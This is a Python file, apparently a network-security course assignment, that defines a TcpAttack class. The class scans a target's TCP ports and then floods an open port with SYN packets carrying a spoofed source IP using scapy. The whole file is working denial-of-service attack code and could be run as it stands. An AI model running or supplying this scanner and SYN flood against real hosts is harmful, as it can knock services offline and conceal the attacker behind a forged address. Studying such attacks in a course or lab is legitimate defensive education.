import socket
from telnetlib import IP
from scapy.all import *
import sys


# The class for the TCP attack
class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP  # Setting the spoof IP for this class
        self.targetIP = targetIP  # Setting the target IP for the TCP Attack

    def scanTarget(self, rangeStart, rangeEnd):
        # Scans for open ports using the socket library, tries to connect to those ports and adds port to list
        # of open ports is connection is successful. Prints an exception if one is thrown from the try-except block.

        open_ports = []
        # ports = open("openport.txt","w")
        for i in range(rangeStart, rangeEnd + 1):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)  # Connection timeout set to 0.2s
            try:
                s.connect((self.targetIP, i))
                open_ports.append(i)  # Adding port to list of open_ports
            except Exception as e:
                print(e)
                sys.stdout.write(".")
                sys.stdout.flush()

        # Writing the list of open ports to output file, with one port in each line.
        with open("openports.txt", "w") as f:
            if open_ports:
                open_ports = sorted(open_ports)
                for k in range(0, len(open_ports)):
                    f.write("%s\n" % open_ports[k])

    # The attackTarget method. Sends a certain number of Syn packets to the destination port at the targetIP.
    def attackTarget(self, port, numSyn):
        srcIP = self.spoofIP
        destIP = self.targetIP  # (2)
        destPort = port  # (3)
        count = numSyn  # (4)
        check = False

        # Checking if port is open
        with open("openports.txt", "r") as f:
            for line in f:
                if str(destPort) in line:
                    check = True

        # Proceeding with attack if port is open, else returning 0. Code taking from Lecture 16 of ECE 404.
        if check is True:
            for i in range(count):  # (5)
                IP_header = IP(src=srcIP, dst=destIP)  # (6)
                TCP_header = TCP(flags="S", sport=RandShort(), dport=destPort)  # (7)
                packet = IP_header / TCP_header  # (8)
                try:  # (9)
                    send(packet)  # (10)
                except Exception as e:  # (11)
                    print(e)
            return 1

        return 0
